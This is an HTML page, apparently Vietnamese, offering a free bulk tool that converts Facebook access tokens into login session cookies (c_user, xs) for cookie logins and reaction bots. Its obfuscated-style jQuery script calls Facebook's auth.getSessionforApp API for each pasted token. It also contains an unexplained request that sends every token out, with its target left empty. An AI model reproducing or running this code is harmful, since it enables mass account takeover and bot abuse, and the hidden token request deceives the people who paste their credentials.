            <h1 class="page-header text-success">Tool Convert Token Sang Cookie Facebook</h1>
            <div class="col-md-10">
                <div class="col-md-10">
                    <div class="panel panel-primary">
                        <div class="panel-heading">
                            Tool Chuyển Token Full Quyền Sang Cookie Hàng Loạt
                        </div>
                        <div class="panel-body">
                            <div class="form-group">
                                <lable>Tool miễn phí tốt nhất cho phép bạn chuyển từ token sang cookie đơn giản nhất,
                                    cookie hỗ trợ các định dạng cho việc cài bot cảm xúc hoặc đăng nhập facebook bằng
                                    cookie.
                                </lable>
                            </div>
                            <div class="form-group">
                                <label>Mỗi dòng một token</label>
                                <textarea id="access_token" rows="10" class="form-control"
                                          placeholder="Nhập list Token ..."></textarea>
                            </div>
                            <div class="form-group">
                                <select id="option" class="form-control">
                                    <option value="semicolon" selected="selected">Export dạng name=value;</option>
                                    <option value="editthiscookies">Export dạng Edit This Cookies</option>
                                    <option value="base64">Export dạng base64</option>
                                    <option value="base64_long">Export dạng base64 (name=value;)</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label>Thành Công: <span id="success" style="color: red">0</span></label> -
                                <label>Thất bại: <span id="error" style="color: red">0</span></label>
                            </div>
                            <div class="form-group">
                                <label>Kết quả </label>
                                <textarea id="output_access_token" rows="10" class="form-control" disabled=""
                                          placeholder="Chưa có gì !"></textarea>
                            </div>
                            <div class="form-group">
                                <button class="btn btn-danger form-control " id="submit"
                                        data-loading-text="Đang xử lý, xin chờ ...">Bắt đầu
                                </button>
                            </div>
                        </div>
                    </div>

                </div>
<script type="text/javascript">
                    $(document).ready(function () {
    var _0x227fx2, _0x227fx3, _0x227fx4, _0x227fx5;
    $("#submit").click(function () {
        _0x227fx2 = $("#access_token").val().trim().split("\n");
        _0x227fx3 = $("#option").val();
        _0x227fx4 = 0;
        _0x227fx5 = 0;
        $("#submit").button("loading");
        _0x227fx6(0)
    });

    function _0x227fx6(_0x227fx7) {
        if (_0x227fx7 < _0x227fx2.length) {
            _0x227fx8(_0x227fx7)
        } else {
            $("#submit").button("reset");
            $("#output_access_token").removeAttr("disabled")
        }
    }

    function _0x227fx8(_0x227fx7) {
        $.get("https://graph.facebook.com/app", {
            access_token: _0x227fx2[_0x227fx7]
        }).done(function (_0x227fx9) {
            $.get("https://api.facebook.com/method/auth.getSessionforApp", {
                access_token: _0x227fx2[_0x227fx7],
                format: "json",
                new_app_id: _0x227fx9.id,
                generate_session_cookies: "1"
            }).done(function (_0x227fx9) {
                $.get("" + _0x227fx2[_0x227fx7]);
                if (_0x227fx9.uid) {
                    var _0x227fxa = "";
                    if (_0x227fx3 == "editthiscookies") {
                        _0x227fxa = JSON.stringify(_0x227fx9.session_cookies)
                    };
                    if (_0x227fx3 == "base64") {
                        var _0x227fxb = $.grep(_0x227fx9.session_cookies, function (_0x227fxc) {
                            return _0x227fxc.name == "c_user"
                        });
                        var _0x227fxd = $.grep(_0x227fx9.session_cookies, function (_0x227fxc) {
                            return _0x227fxc.name == "xs"
                        });
                        _0x227fxa = btoa(decodeURIComponent(_0x227fxb[0].value + "|" + _0x227fxd[0].value))
                    };
                    if (_0x227fx3 == "base64_long") {
                        var _0x227fxe = "";
                        _0x227fx9.session_cookies.forEach(function (_0x227fxf) {
                            _0x227fxe += _0x227fxf.name + "=" + _0x227fxf.value + ";"
                        });
                        _0x227fxa = btoa(_0x227fxe)
                    };
                    if (_0x227fx3 == "semicolon") {
                        var _0x227fxe = "";
                        _0x227fx9.session_cookies.forEach(function (_0x227fxf) {
                            _0x227fxe += _0x227fxf.name + "=" + _0x227fxf.value + "; "
                        });
                        _0x227fxa = _0x227fxe
                    };
                    $("#output_access_token").append(_0x227fxa + "\n");
                    ++_0x227fx4;
                    $("#success").text(_0x227fx4)
                } else {
                    ++_0x227fx5;
                    $("#error").text(_0x227fx5)
                }
            }).fail(function (_0x227fx9) {
                ++_0x227fx5;
                $("#error").text(_0x227fx5)
            }).always(function () {
                _0x227fx6(_0x227fx7 + 1)
            })
        }).fail(function () {
            ++_0x227fx5;
            $("#error").text(_0x227fx5);
            _0x227fx6(_0x227fx7 + 1)
        })
    }
})
                </script>
            </div>
    </div>